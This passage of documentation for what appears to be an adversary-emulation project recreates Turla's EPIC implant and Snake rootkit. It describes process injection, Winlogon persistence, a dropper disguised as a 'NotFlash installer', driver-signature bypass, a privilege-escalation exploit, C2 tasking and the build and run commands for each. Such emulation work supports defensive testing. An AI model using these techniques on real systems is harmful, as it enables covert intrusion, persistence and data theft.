an empty symbols table.","Note that the above compilation command will also build the unit tests, which you can run via:"]},{"l":"On Windows in VSCode Through Visual Studio Tools","p":["./bootstrap-vcpkg.sh","./vcpkg integrate install","Alternative option is to setup tasks.json as described on the website. Compiler path in c_cpp_properties.json will also need to change to \"compilerPath\": \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.33.31629\\bin\\Hostx86\\x86\\cl.exe\"","cd C:\\","cd vcpkg","choco install cmake --installargs 'ADD_CMAKE_TO_PATH=System'","CMake","CMake Tools","CMake: CMake Path","CMake: Generator","From the Start Menu, open \"Developer Command Prompt for VS 2022\"","git clone https://github.com/Microsoft/vcpkg.git","If cmake was already installed but not on your path, fully uninstall and install with the above arguments.","In Command Palette, run CMake: Build. Run on any compiler.","Install Build Tools for Visual Studio 2022","Install vcpkg with these commands:","Make sure CMake is installed on your machine","Make sure this is empty","Make sure you have the extentions:","Mine is at C:\\Program Files\\Cmake\\bin\\cmake.exe.","Navigate to folder with code, then use code . to open VS Code.","See https://code.visualstudio.com/docs/cpp/config-msvc","Set a system level environment variable named VCKPG_ROOT to the root of your installation directory. For example, VCPKG_ROOT = C:\\Users\\dev\\vcpkg.","Set to where ever the cmake executable is located","Setup VSCode to Use MSVC","Some settings are required for CMake in VSCode:","The projects dependencies (cryptopp) will now automatically be installed at build time.","You will need to restart the shell to use cmake."]},{"l":"Common Compiling Errors","p":["For all problems: start by deleting the build folder than using the CMake: Delete Cache and Reconfigure command. With most changes below, this is needed to actually register the change.","If the compiler complains that \"cryptopp::cryptopp\" does not exist, change src/CMakeLists.txt on line 37 and 39 from \"cryptopp::cryptopp\" to \"cryptopp-static\".","If the compilation process says it cannot find cryptopp package, manually install cryptopp on the system with matching compiler triplet. Example: vcpkg.exe install cryptopp:x64-windows.","If the compiler complains about a missing external symbol within cryptopp, named something like __ std_find_trivial_1, change to a different compiler version. Windows compiler version 17.3 seems to be troublesome with cryptopp, but not always. Do the full refresh described above after the compiler change."]},{"l":"How to Test","p":["To setup testing, you must have the C2 server up and running on a seperate machine, and this code must be run from VS Code in administrator mode. The environment variable VCPKG_ROOT must already be set when opening powershell.","Tests are also run through CMake. Make sure CMake is installed with the instructions above.","For the tests to run properly, a C2 server providing tasks needs to be at 10.0.2.11:8080 with a resource at /javascript/view.php. To change the address of the C2 server, edit values in dummyConfigFile.txt and testing.h."]},{"l":"On Windows in VSCode","p":["In Command Palette, run CMake: Run Tests."]},{"l":"In a Shell in Windows Powershell","p":["Once the package is built, run $ cd build then $ ctest"]},{"l":"CTI Sources","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html"]},{"l":"Missing Items","p":["Some details differ from the CTI. This includes the checks of other websites before connection to the C2 server. Our version of the communications library also does not execute any commands, always passes them on to the orchestrator."]},{"l":"External Libraries and Tools Used","p":["CMake is used for compilation, which is distributed under the OSI-approved BSD 3-clause License. None of the CMake code is included in the files.","Vcpkg is used but not packaged with this code. The software is managed by Microsoft and licensed under the MIT License, authorizing free use of the software."]}],[{"l":"EPIC","p":["EPIC is broken up into the following components:","Component","Description","Payload","Third stage worker DLL for the EPIC implant. It is compiled as a DLL, and communicates with a hardcoded C2 server and port value via HTTP POST requests.","Reflective Guard","Second stage guard DLL for the EPIC implant. It is compiled as a DLL, and loads the third stage payload or an arbitrary .dll substitute as an embedded resource.","Reflective Injector","First stage injector for the EPIC implant. It is compiled as an executable, and loads the second stage guard or an arbitrary .dll payload as an embedded resource.","Simple Executable Dropper","\"Simple\" dropper program that enables the delivery of an executable to a subtle location on the victim machine and alters the registry keys so that the executable will run on the user's logon."]},{"l":"Build Instructions","p":["Manually","All instructions to build the EPIC components manually are detailed in their respective READMEs. The links to the individual build sections are below.","Payload Build Guard Build Injector Build SimpleDropper Build","Using the build script","You can use the buildall.ps1 script to build any or all of the EPIC components.","From the turla\\Resources\\EPIC directory in Powershell:","The script will use HTTP and a default C2 server (address and port) if none are specified. If no EPIC components are specified in the build input, all components will be built by default. To build one or more specific components, input any variation of: payload guard injector simpledropper. To build all of the components, input all.","No cleanup is required to rebuild the components using the script. If building the payload or guard DLLs, the script will create a txt file in the EPIC directory containing the converted DLL shellcode. All necessary resource preparation for the components is handled by the build script. If you would like to add an alternative resource, please follow the instructions detailed in the component's respective README linked above."]},{"l":"Execution Details","p":["Payload Execution Guard Execution Injector Execution SimpleDropper Execution"]},{"l":"Cleanup Instructions","p":["Cleanup instructions for the individual EPIC components are linked below.","Payload Cleanup Guard Cleanup Injector Cleanup SimpleDropper Cleanup","Using the cleanup script","EPIC's cleanup script can be accessed here. This script should be run from the domain controller of the range with administrative privileges.","For Carbon scenario cleanup:","From the Kali Linux machine ( 176.59.15.33):","Open an Admin PowerShell and execute the cleanup script:","Note: To cleanup the SYSTEM-level EPIC implant, a reboot of HOBGOBLIN is required.","Sign out of the RDP session when finished.","For Snake scenario cleanup:","NOTE: A restart of AZUOLAS is not required as long as Egle as been logged out."]},{"l":"Troubleshooting"},{"l":"SimpleDropper","p":["Check via Registry Edit as the current user that the Winlogon key was properly created:","HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","Check that the injector mxs_installer.exe was dropped to the user's%APPDATA% folder"]},{"l":"Injector","p":["At the user-level, the injector is not selective of which explorer.exe it injects into. If there are additional users logged into the host, there is a chance the injector may inject into an explorer.exe that does not belong to the current user."]},{"l":"Guard","p":["At the user-level, the guard is will search for msedge.exe processes(among other browser-like processes) to inject into. If none exist, guard will wait until an msedge.exe becomes available.","Similar to the injector, no additional users should be logged into the host."]},{"i":"payloadworker-dll","l":"Payload/Worker DLL","p":["Check if %APPDATA%\\Temp\\~D723574.tmp is growing in size every 15 seconds","If yes:","C2 domain/port may be incorrect","C2 server may be configured improperly","Network flow may be configured improperly (redirectors, etc.)","If not or it's missing:","Payload/Worker DLL was most likely not injected into Edge properly"]},{"l":"CTI References","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/"]}],[{"l":"EPIC Guard"},{"l":"Overview","p":["This is the second stage guard DLL for the EPIC implant. It is compiled as a DLL, and loads the third stage payload or an arbitrary .dll substitute as an embedded resource. The guard, once compiled, can only be run via it's exported function Protection. A small DLL_Run solution is included to run guard directly from Visual Studio. It can also be run via rundll32.exe, but console output and debugging will be unavailable.","The guard, like its parent injector, behaves differently based on what permissions it has, and evaluates said permissions at runtime. If the guard does not have elevated permissions then it will target a browser or other low privilege internet enabled application for injection with its payload.","However, when run from a process with elevated privileges, such as PsExec, Services.exe, or an elevated injector, guard will change its target. In order to ensure elevated permissions for its payload Guard changes the injection target to another elevated process- i.e. an instance of svchost.exe with SE_DEBUG privileges (but not its current process)."]},{"l":"Set Up"},{"l":"Visual Studio","p":["Ensure that the correct character set is selected:","Project Properties Advanced Character Set select No Set.","Check that the project has a Resource.rc file. If one does not exist create one:","right-click project Add New Item Resource Resource File.","If one alreadys exists, check that the Resource.rc file has no resources loaded, and delete any found:","double-click Resource.rc drop down menu right-click IDR_EXAMPLE_BIN1 delete.","Remove Compilation Warnings:","Project Properties C/C++ Preprocessor Preprocessor Definitions Edit new line _CRT_SECURE_NO_WARNINGS."]},{"l":"Resource Preparation","p":["Compile the payload you would like to use, or DLL_Test solution (included), as you would any other DLL (\"build\" in VS works fine)","Follow this guide for converting the payload to shellcode.","Clone the sRDI repo, Note that you must checkout the sRDI repo to commit 5690685aee6751d0dbcf2c50b6fdd4427c1c9a0a or it will not function.","Open Powershell and navigate to the Powershell directory of the sRDI repo (double check that you're checked out to the correct commit).","Move a copy of the compiled .dll file to the Powershell directory (GUI or mv cmd work).","Import the conversion module: Import-Module .\\ConvertTo-Shellcode.ps1","Perform the conversion:","Paste the contents of the payload.txt file into HxD and save it as a binary (i.e. DLLTest.bin). Remember the location of this binary, you will need it for the next step.","Once the .dll file has been converted to a shellcode binary follow this guide for adding it as a resource.","Click on Resource Files in Solution Explorer and selected Add Resource. (Note that if your project does not have a .rc file you will need to create one)","Click Import and navigate to wherever you stored the .bin file from Step 2 above.","Give the resource a type name; I suggest something simple as you will need to remember it later. Ex \"TEST_BIN\"","The resource file should now show up in your program's resource view","Change the arguements of the FindResourceW() call in Source.cpp to match the new resource name. If you used the examples above it would be: FindResourceW(NULL, MAKEINTRESOURCEW(IDR_TEST_BIN1), LTEST_BIN)","Build the updated reflective-guard solution in VS"]},{"l":"Build Instructions","p":["From Visual Studio:","From Solution Explorer:","Build Build Solution","The compiled executable(s) should appear in:","turla\\Resources\\EPIC\\Defense-Evasion\\reflective-guard\\x64\\Release\\DLL_Run.exe","turla\\Resources\\EPIC\\Defense-Evasion\\reflective-guard\\x64\\Release\\Intermediary.dll"]},{"l":"Execution","p":["The Reflective Guard is intended to execute in the scenario as an embedded resource inside of EPIC's Reflective Injector, which is subsequently embedded in the SimpleDropper executable. Executing either the Injector or SimpleDropper executables will result in it's execution. To execute just the Guard DLL and it's embedded resource, spawn an msedge.exe process and then run DLL_Run.exe. See here if you encounter any issues."]},{"l":"From Visual Studio","p":["Build the executable from Visual Studio as instructed above","At the top of the VS window click \"Local Windows Debugger\" or \"Start Without Debugging\""]},{"l":"As A Service","p":["Build the executable from Visual Studio as instructed above","From an admin command prompt run:","sc.exe create [service name] binpath= turla\\Resources\\EPIC\\Defense-Evasion\\reflective-guard\\x64\\Release\\DLL_Run.exe type= own start= demand error= normal","Open Services.exe and start the service with [service name]"]},{"l":"From PsExec","p":["Build the executable from Visual Studio as instructed above","From an admin command prompt run:","psexec -i -s turla\\Resources\\EPIC\\Defense-Evasion\\reflective-guard\\x64\\Release\\DLL_Run.exe"]},{"l":"Cleanup Instructions"},{"l":"Logging Enabled","p":["From an admin command prompt run:","del C:\\Users\\Public\\guard_log.txt"]},{"i":"as-a-service-1","l":"As A Service","p":["From an admin command prompt run:","sc delete [service name]"]},{"l":"CTI References","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/"]}],[{"l":"EPIC Injector"},{"l":"Overview","p":["This is the first stage injector for the EPIC implant. It is compiled as an executable, and loads the second stage guard or an arbitrary .dll payload as an embedded resource. The injector, once compiled, can be run from anywhere, including making it the target of PsExec or a Windows Service.","The injector behaves differently based on what permissions it has, and evaluates said permissions at runtime. If the injector does not have elevated permissions then it will target explorer.exe for injection with its payload.","However, when run from a process with elevated privileges, such as PsExec or Services.exe injector will change its target. In order to retain elevated permissions for its payload it changes the injection target to another elevated process- i.e. an instance of svchost.exe with SE_DEBUG privileges."]},{"l":"Set Up"},{"l":"Visual Studio","p":["Ensure that the correct character set is selected:","Project Properties Advanced Character Set select No Set.","Check that the project has a Resource.rc file. If one does not exist create one:","right-clcik project Add New Item Resource Resource File.","If one alreadys exists, check that the Resource.rc file has no resources loaded:","double-click Resource.rc drop down menu right-click IDR_EXAMPLE_BIN1 delete.","Remove Compilation Warnings:","Project Properties C/C++ Preprocessor Preprocessor Definitions Edit new line _CRT_SECURE_NO_WARNINGS."]},{"l":"Resource Preparation","p":["Compile the payload you would like to use, or DLL_Test solution (included), as you would any other DLL (\"build\" in VS works fine)","Follow this guide for converting the payload to shellcode.","Clone the sRDI repo, Note that you must checkout the sRDI repo to commit 5690685aee6751d0dbcf2c50b6fdd4427c1c9a0a or it will not function.","Open Powershell and navigate to the Powershell directory of the sRDI repo (double check that you're checked out to the correct commit).","Move a copy of the compiled .dll file to the Powershell directory (GUI or mv cmd work).","Import the conversion module: Import-Module .\\ConvertTo-Shellcode.ps1","Perform the conversion:","Paste the contents of the payload.txt file into HxD and save it as a binary (i.e. DLLTest.bin). Remember the location of this binary, you will need it for the next step.","Once the .dll file has been converted to a shellcode binary follow this guide for adding it as a resource.","Click on Resource Files in Solution Explorer and selected Add Resource. (Note that if your project does not have a .rc file you will need to create one)","Click Import and navigate to wherever you stored the .bin file from Step 2 above.","Give the resource a type name; I suggest something simple as you will need to remember it later. Ex \"TEST_BIN\"","The resource file should now show up in your program's resource view","Change the arguements of the FindResourceW() call in Source.cpp to match the new resource name. If you used the examples above it would be: FindResourceW(NULL, MAKEINTRESOURCEW(IDR_TEST_BIN1), LTEST_BIN)","Build the updated reflective-injector solution in VS"]},{"l":"Build Instructions","p":["From Visual Studio","From Solution Explorer:","Build Build Solution","The compiled executable should appear in:","turla\\Resources\\EPIC\\Defense-Evasion\\reflective_injector\\x64\\Release\\Primary.exe"]},{"l":"Execution","p":["The injector is intended to be executed in the scenario as an embedded resource inside of the SimpleDropper executable. To execute just the Reflective Injector and its embedded resources, spawn an explorer.exe (and msedge.exe if the Reflective Guard DLL is embedded) process and then run the compiled executable Primary.exe. See here if you encounter any issues."]},{"l":"From Visual Studio","p":["Build the executable from Visual Studio as instructed above","At the top of the VS window click \"Local Windows Debugger\" or \"Start Without Debugging\""]},{"l":"As A Service","p":["Build the executable from Visual Studio as instructed above","From an admin command prompt run:","sc.exe create [service name] binpath= turla\\Resources\\EPIC\\Defense-Evasion\\reflective_injector\\x64\\Release\\Primary.exe type= own start= demand error= normal","Open Services.exe and start the service with [service name]"]},{"l":"From PsExec","p":["Build the executable from Visual Studio as instructed above","From an admin command prompt run:","psexec -i -s turla\\Resources\\EPIC\\Defense-Evasion\\reflective_injector\\x64\\Release\\Primary.exe"]},{"l":"Cleanup Instructions"},{"l":"Logging Enabled","p":["From an admin command prompt run:","del C:\\Users\\Public\\injector_log.txt"]},{"i":"as-a-service-1","l":"As A Service","p":["From an admin command prompt run:","sc delete [service name]"]},{"l":"CTI References","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/"]}],[{"i":"simple-notflash-executable-dropper","l":"Simple \"NotFlash\" Executable Dropper"},{"l":"Overview","p":["This is a \"simple\" dropper program that combines two needs:","Delivery of an executable to a subtle location on the victim machine after they double-click a \"NotFlash installer\" file.","Alteration/addition of registry keys so that the delivered executable runs on the user's next login.","Much of this README is cribbed from the EPIC's Reflective Injector README and may, in the future, be upgraded to fully allow entirety of what is bundled in the dropper to never touch disk. As it is, an executable is placed inside the user's hidden AppData\\Local\\TEMP directory.","The Registry Key modification is notably of the H_KEY_CURRENT_USER, not H_KEY_LOCAL_MACHINE - the WinLogon trigger requires the same user to log in. The executable is run via the Shell Registry Key - on logon, a Command Prompt is opened and will run the dropped executable before running a second exe: explorer.exe. Thus it appears normal login execution resumes and the Desktop is available."]},{"l":"Set Up"},{"i":"prior-assumtions--requirements","l":"Prior Assumtions & Requirements","p":["This dropper program needs an existing executable file as a resource. This README assumes that Reflective Injector, or whichever other payload you choose, is already created as an executable file."]},{"l":"Visual Studio Setup","p":["Ensure that the correct character set is selected:","Project Properties Advanced Character Set select No Set.","Check that the project has a Resource.rc file. If one does not exist create one:","right-click project Add New Item Resource Resource File.","If one alreadys exists, check that the Resource.rc file has no resources loaded:","double-click Resource.rc drop down menu right-click IDR_EXAMPLE_BIN1 delete.","Remove Compilation Warnings:","Project Properties C/C++ Preprocessor Preprocessor Definitions Edit new line _CRT_SECURE_NO_WARNINGS."]},{"l":"Resource Preparation","p":["Click on Resource Files in Solution Explorer and selected Add Resource.","Click Import and navigate to wherever your executable file is located.","Give the resource a type name; I suggest something simple as you will need to remember it later. Ex \"SHINY_BOI\"","The resource file should now show up in your program's resource view","Change the arguements of the FindResourceW() call in Source.cpp to match the new resource name. If you used the examples above it would be:"]},{"l":"Build Instructions","p":["From Visual Studio","From Solution Explorer:","Build Build Solution","The compiled executable should appear in:","turla\\Resources\\EPIC\\SimpleDropper\\x64\\Release\\SimpleDropper.exe"]},{"l":"Execution","p":["To execute the SimpleDropper, run the compiled executable SimpleDropper.exe. If the Reflective Injector and Reflective Guard are embedded, ensure you have the explorer.exe and msedge.exe processes running. See here if you encounter any issues."]},{"l":"From Visual Studio","p":["Build the executable from Visual Studio as instructed above.","At the top of the VS window click \"Local Windows Debugger\" or \"Start Without Debugging\""]},{"l":"Test Instructions","p":["Much of the following is noted in the code in comments:","Testing the SimpleDropper to ensure that it delivers a working exe is tricky, as it is reasonable that you want to make sure your embedded exe works, but you don't want to hijack your own machine.","When testing, you really only need to see that you are able to modify a registry key to run an executable of your choice on startup.","So, test your executable separately, and then test the dropper by simply running the dropper itself on startup. To test:","Compile and run SimpleDropper (you need to run it to change the registry.)","Take the compiled SimpleDropper executable and place it on your desktop, or whichever other place you assign to the exe_location variable.","Delete your newly-dropped injector exe, which is located in your local AppData\\Local\\Temp folder until further updates","Log out and back in again.","SimpleDropper should run (again) on startup, depositing an executable file in the same place. If your deleted injector reappears, your dropper is working. Comment out the test-assignment of exe_location and uncomment the release-assignment (should be right below in the code, setting exe_location equal to full_path, the path to the embedded exe you just dropped in AppData\\Local\\Temp. Thus, instead of running itself on startup, someone who double-clicks the SimpleDropper will run an executable of your choice on startup)"]},{"l":"Cleanup Instructions","p":["Restore the Winlogon key altered at the executing user's HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon so that only 'C:\\Windows\\explorer.exe' is run on login","Remove the EPIC injector executable in the executing user's AppData\\Local\\Temp directory: '%TEMP%\\mxs_installer.exe","Cleanup the embedded artifacts ( Guard/ Payload)"]},{"i":"cti--references","l":"CTI / References","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/","https://stackoverflow.com/questions/71073166/how-to-embed-an-exe-file-into-another-exe-file-as-a-resource-in-c"]}],[{"l":"EPIC Payload"},{"l":"C2 Communications","p":["The EPIC payload communicates with a hardcoded C2 server and port value via HTTP POST requests. 1"]},{"l":"C2 Registration","p":["The module will automatically perform initial discovery commands and output the results to a tmp file in %TEMP% with a random string in its filename: %TEMP%\\~Drandom.tmp. 1 For scenario purposes, this file name has been hardcoded to %TEMP%\\~D723574.tmp. The discovery output is returned in the POST request body.","The POST request body is bzip2 compressed and then formatted in a Base64 encoded JSON string with fields UUID, type, and data and are not made to any particular subfolder and are sent to the URL path / of the C2 server site. The initial heartbeat is structured as follows:","EPIC will use the type field to indicate to the C2 server what type of data to receive based on the task.","Type","Description","command","Associated with the exe key - indicates the returned data contains command output","upload","Associated with the result key - indicates the returned data contains a file","download","Associated with payloads and the name key - indicates download was successful","delete","Associated with the name and del_task keys - indicates delete was successful","Upon registration with the C2 server, the module will receive a UUID to use in future communications. The module will then continue to perform POST requests to the domain name of the C2 server site to receive instructions and return result output."]},{"l":"Execute Commands","p":["Upon receiving instructions to execute commands, the module will execute the command, append command output to %TEMP%\\~D723574.tmp, and return the command output in the next C2 communication cycle. 1"]},{"l":"Execution","p":["The Payload is intended to execute in the scenario as an embedded resource inside of EPIC's Reflective Guard, which is subsequently embedded in the Reflective Injector. Executing either the Guard DLL or Injector executable will result in the execution of the Payload DLL. To execute just the Payload, you can run it via rundll32.exe with the exported function PayLoop. See here if you encounter any issues."]},{"l":"Tasks","p":["0","4","8","8 + p","8 + p+ 4","Byte Offset","Command ID","Configuration","Configuration size","Configurations are INI structured files which contain some of the following fields:","del_task","Delete a file.","Description","EPIC instructions are structured as followed:","Example delete file configuration:","Example download file configuration (instruction should have associating payload data):","Example execute command configuration:","Example upload file configuration:","exe","Execute a command, redirect its output to the file %TEMP%~D%random%.tmp. The file is then uploaded during the next C&C communication cycle.","Instruction Section","Instructions with no payloads (EXE binaries) to download to the module will have a Payload size of 0.","Name","Payload","Payload size ( p)","result","Set the filename that is supposed to contain the results of command execution. Effectively, any existing file may be marked for upload by this command.","Set the filename to be deleted or created (depends on other parameters)","The EPIC payload receives tasking from the C2 server as part of a successful beacon response.","To retrieve an instruction, the response should be base64 decoded and then bzip2 decompressed."]},{"l":"Encryption"},{"l":"RSA encryption","p":["sha1 hash function","OAEP padding","2048 bit key"]},{"l":"AES encryption","p":["256 bit key","CBC mode of operation"]},{"l":"Build Instructions","p":["Notes about Bzip2 The EPIC payload used a modified version of BZip2 compiled as a static library. Modifications to BZip2 primarily consisted of stripping debug statements throughout the source files. The modifed BZip2 static library has been removed from this repository, however vcpkg will install an unmodified BZip2 library upon building the payload that will function as needed.","If you are interested in downloading and modifying BZip2, you can find it here. CMake build instructions can be found here. Once compiled, bz2_static.lib should be copied to payload\\libs\\lib\\bzlib.lib and the bzlib.h should be copied to payload\\libs\\include\\bzlib.h. Create the relevant directories if they do not already exist. Please also make the necessary adjustments to the CMakeLists.txt and vcpkg.json files. 1 2 3 4 5","From Visual Studio Developer PowerShell:","The compiled DLL and executable will be located in: EPIC\\payload\\bin","When built with the build script, EPIC will use a default C2 server (address and port) and HTTP for communications. To compile with a different C2 server address and port or to use HTTPS communications, change the corresponding values in the line from above ( cmake -S . -B build -DUSE_HTTPS=true/false...). For example, to build the payload with C2 server example.com, port 1234, and HTTPS selected, run:","Run the remaining command as written above. To note: the payload binary name res corresponds to HTTP and res2 to HTTPS.","To remove symbols, you can use the strip command:","To verify, you can run strings or objdump --syms bin\\test_res.exe- you should see an empty symbols table.","To run unit tests:"]},{"l":"Cleanup Instructions","p":["Remove the log file:","Kill all Edge browsers potentially containing payload injected into it:"]},{"l":"CTI References","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/"]}],[{"l":"Snake Rootkit","p":["Snake is a rootkit used by Turla, and the version in this repository emulates several features of the original rootkit 1:","hides itself by hooking into several Windows API functions","drops the usermodule DLL to disk ( C:\\Windows\\msnsvcx64.dll in our emulated variant)","injects the usermodule DLL into a SYSTEM process ( taskhostw.exe in our emulated variant) and into browser processes ( msedge.exe in our emulated variant) upon detecting outbound network traffic","When the rootkit is installed, its Snake home directory is set to C:\\Windows\\$NtUninstallQ608317$(can be changed at installer compile time), which is where the Snake rootkit driver file and usermodule DLL log files reside.","Snake has used similar home directories in the past, such as C:\\Windows\\$NtUninstallQ812589$ 1"]},{"l":"Components"},{"l":"Snake Installer","p":["The SnakeInstaller folder contains the source code, README, and additional resources for the Snake installer, which does the following:","Sets up the Snake home directory","Optional privilege escalation exploit CVE-2021-1732","DSE bypass by exploiting a vulnerable signed driver that is also dropped by the installer","Dropping the Snake rootkit driver to disk and installing it","Note that the Snake installer is bundled with both drivers inside, and since the Snake rootkit driver contains the embeded usermodule DLL, any changes to the usermodule DLL or to the rootkit driver will require a new installer to be compiled. Different installers will also be needed to target different hosts, since each usermodule DLL is compiled to reach out to a specific C2 domain or IP.","For more information on the Snake Installer, please see the installer README."]},{"l":"Snake Rootkit Driver","p":["The Snake rootkit driver is run by the Snake installer and performs various rootkit functionality:","hides itself by hooking into several Windows API functions via a modified InfinityHook library","drops the usermodule DLL to C:\\Windows\\msnsvcx64.dll(stored XOR-encrypted within the driver)","injects the usermodule DLL into taskhostw.exe","injects the usermodule DLL into browser processes (e.g. msedge.exe) upon detecting outbound network traffic","For more information on the Snake rootkit, please see the rootkit README."]},{"l":"Usermodule DLL","p":["The UserModule folder contains the source code, README, and additional resources for the Snake usermodule DLL, which does the following:","When injected into a browser process, handles C2 communications over HTTP","Retrieves tasking and payloads to forward to the non-browser usermodule variant, uploads files and task output","When injected into a non-browser process, executes commands","Supports executing commands via cmd, powershell, direct process creation, and also supports token impersonation.","Note that the usermodule DLL is given the C2 address and Snake home directory at compile-time, so any adjustments to such variables will require compiling a new usermodule DLL, and thus a new rootkit driver and installer.","For more information on the Snake usermodule DLL, please see the usermodule DLL README."]},{"l":"Usage","p":["To install the Snake rootkit using the Snake installer, you can use the following commands for default options:","(with privilege escalation exploit):","(without privilege escalation exploit - requires admin privileges)","For additional installer options, please see the installer README.","If you are running just the driver, you must have a machine with test signing mode ON. To do this, open an Administrative command prompt, enter Bcdedit.exe -set TESTSIGNING ON and reboot your machine. You should now see \"Test Mode\" in the bottom right hand corner of your desktop.","Run the script .\\run_driver.ps1 start in the same directory as your driver, and it will automatically create and start the driver for you. To stop the driver, run .\\run_driver.ps1 stop","If you are running the driver via the installer, test signing mode is not necessary."]},{"l":"Troubleshooting"},{"l":"Installer Troubleshooting","p":["Please see the Snake Installer README for installer-related troubleshooting steps."]},{"l":"Usermodule Troubleshooting","p":["./evalsC2client.py --set-task guid '{type: 6}'","dbsvcng64.bin for logging related to command execution (process creation, exit codes, command output)","Each log file covers different aspects of the implant:","If the Snake installer is successful but you don't receive a beacon, there are two main possible points of failure:","If you do not have a beacon, you will have to manually copy the files from the Windows target host to your linux C2 server, where you can call the control_server/handlers/snake/decrypt_logs.py utility like so:","If you have successful beacons and are troubleshooting other issues, you can task the implant to upload the logs to the C2 server, which will automatically decrypt them and write them to the control_server/files directory:","Note that error codes in the logs will either be a Windows system error code or a custom error code defined in UserModule/include/usermodule_errors.h","python3 decrypt_logs.py -p /path/to/log -o /path/to/output/file","svcmon32.sdb for C2-related logging (heartbeats, beacons, payload downloads, instruction parsing, data uploads)","svcstat64.bin for pipe server logging (when in pipe server mode)","The C2-related log ( svcmon32.sdb) is used exclusively by the browser-injected DLL process. If the file exists, then the injected DLL was at least able to get far enough to begin logging. If the file exists but is not being updated, then either the DLL crashed or is stuck waiting for the taskhostw-injected DLL to connect to it via named pipes.","The driver was unable to inject successfully into msedge.exe, or the injected DLL crashed","The driver was unable to inject successfully into taskhostw.exe or the injected DLL crashed","The execution log ( dbsvcng64.bin) is used exclusively by the taskhostw-injected DLL and has at least one line written to it when the injected DLL starts up. If the file exists, then the injected DLL was at least able to get far enough to begin logging.","There are two ways to decrypt and read the log files:","To investigate execution-related issues (e.g. failed token impersonation), look at the execution log.","To investigate general C2 communication issues, look at the C2 logs and pipe-related logging.","udmon32.bin for pipe client logging (when in pipe client / execution mode)","You can generally tell which injected DLLs started up by looking for the log files in the Snake home directory ( C:\\Windows\\$NtUninstallQ608317$) and checking their timestamps:"]},{"l":"Build","p":["For specific build/installation instructions for each component, please refer to their respective README files."]},{"l":"Debugging","p":["In order to properly test, it is recommended to setup a Virtual Machine on which install and run the driver. That's because any bugs in this code base can cause the executing system to crash. Additionally, this system will need to have test signing mode enabled, in order to load our unsigned driver.","To view any output from the driver will also require tooling with the ability to attach to the target system's kernel. Recommended solutions are to use WinDbg from the host machine for advanced debugging needs. Or, for lighter testing DebugView is capable of reporting messages printed from the driver.","WinDbg remote debugging setup instructions","DebugView download from SysInternals"]},{"l":"Cleanup","p":["A cleanup script has been provided here. This script should be run from an Admin PowerShell terminal.","The script will perform the following actions:","Cleanup any PsExec artifacts","Delete signed driver service","Delete unsigned driver service","Clean up installer directory","Delete Snake installer (if -deleteInstaller)","Restart the host (if -restart)","Remove dropped user module DLL","Recheck and redelete signed driver service","The script should be run with -restart if the user module DLL has been injected."]},{"l":"CTI and References","p":["https://artemonsecurity.com/snake_whitepaper.pdf","https://www.circl.lu/pub/tr-25/"]}],[{"l":"Snake Driver","p":["The Snake driver is the threat actor's rootkit. There are three projects included in this SnakeDriver Solution.","SnakeDriver - A WDM kernel driver project for the Snake rootkit","libinfinityhook - InfinityHook library, enables syscall hooks. More information can be found in ./libinfinityhook/README.md or on the InfinityHook GitHub","SnakeTester - userspace tool used to test certain syscall hooks"]},{"l":"Overview","p":["Once the installer successfully implants the Snake driver, it is responsible for evading detection and injecting the usermodule. To accomplish these goals the driver comes equipped with several features:","libinifinityhook is used to filter several syscalls","An embedded DLL is XOR'd and dropped to disk","This DLL is then injected into a SYSTEM level process ( taskhostw)","The Windows Filtering Platform is used to monitor processes that communicate over HTTP/HTTPS","Once a target process is observed communicating, it injects the DLL","If the injected process exits, the driver will begin listening for HTTP/HTTPS from target processes again and then reinject","With those tasks completed, the stage is now set for the usermodule to manage command and control communications and execute tasks."]},{"l":"Installation"},{"l":"Visual Studio Configuration","p":["Building the driver requires several SDKs from Microsoft. Follow the Microsoft setup instructions here in order to guarantee a functional kernel development environement.","Windows SDK","Windows Driver Kit","OR","Enterprise Windows Driver Kit(Self-contained build env in a mountable ISO)"]},{"i":"python-optional","l":"Python (optional)","p":["If you would like to use the ..\\buildall.ps1 script which includes installer and usermodule builds, XORs, and embedding, you will need to install Python 3.x. Ensure that it is on your PATH and can be called via python from the command line."]},{"l":"Compilation","p":["All compilation so far is done using Configuration:Release Platofrm:x64","If you are not using the VS GUI, there is a script turla\\Resources\\Snake\\SnakeDriver\\build_and_copy_driver.ps1 that will select the proper configuration for you, and takes an optional argument to copy the newly built driver to a new directory.","SnakeDriver is version dependent, and has been tested and configured for two versions of Windows 10: 1809 and 1903. This is necessary to be comaptible with InfinityHook. It can be expanded to support more versions of Windows by extracting the appropriate syscall numbers and adding a new #ifdef. Syscall numbers can be found here"]},{"l":"Visual Studio Configurations","p":["Configuration","Platform","Notes","Release","x64","DEBUG_PRINT, WIN10_1903","Release_1903","No debug output, pdb renamed, WIN10_1903","Release_1809","No debug output, pdb renamed, WIN10_1809"]},{"l":"Compiling the driver","p":["Compiling via the VS GUI and msbuild are supported. InfinityHook compilation warnings are to be expected.","Sample msbuild command (Must be run from VS Developer Command Prompt):","msbuild -target:Clean,Build -property:Configuration=Release_1903,Platform=x64"]},{"i":"buildallps1","l":"buildall.ps1","p":["This compilation script will compile the usermodule, XOR it, convert it into payload.hpp in the driver, and then compile the driver. all intermediate and final files will be stored in .\\out\\"]},{"l":"Running","p":["If you are running just the driver, you must have a machine with test signing mode ON. To do this, open an 